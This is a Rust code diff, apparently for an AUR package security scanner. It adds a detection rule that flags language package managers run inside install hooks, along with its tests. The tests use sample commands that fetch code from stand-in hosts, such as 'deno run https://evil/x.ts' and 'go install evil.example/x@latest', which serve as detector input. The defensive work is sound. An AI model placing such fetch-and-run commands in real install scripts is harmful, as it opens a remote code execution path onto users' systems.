@@ -743,6 +743,29 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             cwe_id: Some("CWE-494".to_string()),
             enabled: true,
         },
+        Rule {
+            id: "INSTALL-004".to_string(),
+            name: "Language package manager invoked in install hook".to_string(),
+            description: "An install scriptlet invokes a language package manager to fetch/install packages. Installing a package runs its arbitrary build/lifecycle scripts (preinstall, build.rs, setup.py, go generate, ...) at install time -- a remote code execution vector. The June 2026 Atomic Arch campaign used `npm install` this way (see ATOMIC-002); the same applies to pip, poetry, uv, pdm, cargo, go, gem, composer, conda, deno, and others.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![
+                Pattern::Regex { pattern: r"\b(pip[23]?|pipx)\s+install\b".to_string() },
+                Pattern::Regex { pattern: r"\bpoetry\s+(add|install)\b".to_string() },
+                Pattern::Regex { pattern: r"\buv\s+(add|sync|pip|tool|run)\b".to_string() },
+                Pattern::Regex { pattern: r"\bpdm\s+(add|install|sync)\b".to_string() },
+                Pattern::Regex { pattern: r"\bconda\s+install\b".to_string() },
+                Pattern::Regex { pattern: r"\bcargo\s+install\b".to_string() },
+                Pattern::Regex { pattern: r"\bgo\s+(install|get)\b".to_string() },
+                Pattern::Regex { pattern: r"\bgem\s+install\b".to_string() },
+                Pattern::Regex { pattern: r"\bcomposer\s+(require|install)\b".to_string() },
+                Pattern::Regex { pattern: r"\bdeno\s+(install|add|run|cache)\b".to_string() },
+            ],
+            file_types: vec![FileType::InstallScript],
+            recommendation: "Install hooks must never fetch or install packages. Declare real dependencies in depends/makedepends and handle sources in the source= array; report the package to the AUR maintainers.".to_string(),
+            cwe_id: Some("CWE-494".to_string()),
+            enabled: true,
+        },
 
         // ============================================================
         // CRITICAL: Persistence Mechanisms (2018 & 2025 attacks)
@@ -1394,6 +1417,34 @@ mod tests {
         let content = "make && make install";
         let matches = engine.match_content(content, FileType::Pkgbuild);
         assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn test_install004_language_pkg_managers_in_install_hook() {
+        let engine = RuleEngine::default();
+        for s in [
+            "pip install requests",
+            "pip3 install --user evil",
+            "poetry add malware",
+            "uv pip install x",
+            "pdm add y",
+            "cargo install backdoor",
+            "go install evil.example/x@latest",
+            "gem install z",
+            "deno run https://evil/x.ts",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(m.iter().any(|x| x.rule_id == "INSTALL-004"), "missed: {s}");
+        }
+    }
+
+    #[test]
+    fn test_install004_not_in_pkgbuild_build() {
+        // Building a node/python project in build() legitimately runs these;
+        // INSTALL-004 is scoped to install hooks only.
+        let engine = RuleEngine::default();
+        let m = engine.match_content("pip install .", FileType::Pkgbuild);
+        assert!(!m.iter().any(|x| x.rule_id == "INSTALL-004"));
     }
 
     #[test]
